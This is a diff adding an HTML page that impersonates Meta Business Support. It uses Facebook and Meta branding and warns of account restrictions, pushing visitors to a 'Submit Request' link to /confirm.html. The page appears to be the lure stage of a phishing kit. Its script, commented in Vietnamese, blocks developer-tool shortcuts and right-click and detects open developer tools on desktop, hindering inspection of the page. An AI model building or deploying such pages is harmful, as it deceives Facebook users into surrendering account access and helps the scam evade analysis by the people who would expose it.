@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico">
+ 
+  <meta property="og:title" content="Account Verification Required">
+  <meta property="og:description" content="Verify your Facebook account to continue using our services.">
+  <meta property="og:image" content="https://static.dezeen.com/uploads/2021/11/meta-facebook-rebranding-name-news_dezeen_2364_col_hero2-1024x441.jpg">
+    <meta property="og:type" content="website">
+
+  <title>Account Verification Required</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background-color: white;
+      max-width: 600px;
+      width: 100%;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .meta-logo {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .alert-box {
+      background-color: #eeeeee;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+    .alert-box p {
+      margin: 0;
+      font-size: 16px;
+    }
+    .section {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+    .section h3 {
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+    .section p {
+      margin: 0;
+      font-size: 16px;
+    }
+    .button {
+      display: inline-block;
+      background-color: #1877f2;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      text-decoration: none;
+      margin-top: 20px;
+      width: -webkit-fill-available;
+    }
+    .footer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 30px;
+    }
+    @media (max-width: 600px) {
+      .title {
+        font-size: 20px;
+      }
+      .alert-box p,
+      .section p,
+      .section h3 {
+        font-size: 15px;
+      }
+      .button {
+        width: 100%;
+        padding: 14px;
+      }
+      }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" class="meta-logo">
+    <div class="title">Meta Business Support <img src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png" alt="Verification" class="blue-check" style="height: 16px;"></div>
+    <div class="alert-box">
+      <p><strong>⚠️ Verification Required</strong><br><br>
+      Your account needs to be verified to continue using our services. Please complete the verification process.</p>
+    </div>
+    <div class="section">
+      <h3>Important Information</h3>
+      <p>Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats.</p>
+    </div>
+    <div class="section">
+      <h3>Required Information</h3>
+      <p>In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.</p>
+    </div>
+    <div class="section">
+      <h3>Verification Process</h3>
+      <p>Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.</p>
+    </div>
+    <a href="/confirm.html" class="button">Submit Request</a>
+    <div class="footer">
+      from <strong>Meta</strong><br>
+      Meta Terms of Service Team © <script>document.write(new Date().getFullYear());</script> Inc.
+    </div>
+  </div>
+
+  <script>
+// Phát hiện thiết bị mobile
+function isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+           (window.innerWidth <= 768) ||
+           ('ontouchstart' in window);
+}
+
+// Chặn phím tắt mở DevTools (chỉ trên desktop)
+if (!isMobileDevice()) {
+    document.addEventListener('keydown', function (e) {
+        if (
+            e.key === 'F12' ||
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+            (e.ctrlKey && e.key === 'U')
+        ) {
+            e.preventDefault();
+            // Chỉ chặn, không chuyển hướng
+        }
+    });
+    
+    // Chặn chuột phải (chỉ trên desktop)
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+        // Chỉ chặn, không chuyển hướng
+    });
+    
+    // Phát hiện DevTools mở (chỉ trên desktop)
+    let devtoolsOpen = false;
+    const threshold = 160;
+    setInterval(function () {
+        if (
+            window.outerWidth - window.innerWidth > threshold ||
+            window.outerHeight - window.innerHeight > threshold
+        ) {
+            if (!devtoolsOpen) {
+                devtoolsOpen = true;
+                // Chỉ ghi log, không chuyển hướng
+                console.log('DevTools detected');
+            }
+        } else {
+            devtoolsOpen = false;
+        }
+    }, 500);
+    
+    // Phát hiện qua console.log (chỉ trên desktop)
+    (function() {
+        const element = new Image();
+        Object.defineProperty(element, 'id', {
+            get: function() {
+                console.log('DevTools access detected');
+            }
+        });
+        console.log(element);
+    })();
+}
+</script>
+</body>
+</html>
